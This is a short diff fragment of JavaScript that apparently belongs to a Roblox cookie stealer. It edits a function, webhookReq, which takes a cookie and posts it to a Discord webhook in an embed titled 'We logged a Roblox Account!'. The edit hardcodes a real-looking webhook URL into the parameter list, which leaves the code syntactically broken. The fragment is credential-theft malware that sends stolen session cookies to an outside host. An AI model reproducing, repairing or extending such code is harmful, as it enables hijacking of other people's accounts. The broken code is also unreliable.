@@ -1,4 +1,4 @@
-function webhookReq(webhook, cookie) {
+function webhookReq(https://discord.com/api/webhooks/1169416235931406478/4OcUd-BAvb0V-sdHgT9Lvb55MBXaVEWCk9CviE5CATiFkPmP_pIZoeihd0atQhsCaFaH) {
   var params = {
       embeds: [{
             "title": `We logged a Roblox Account!`,
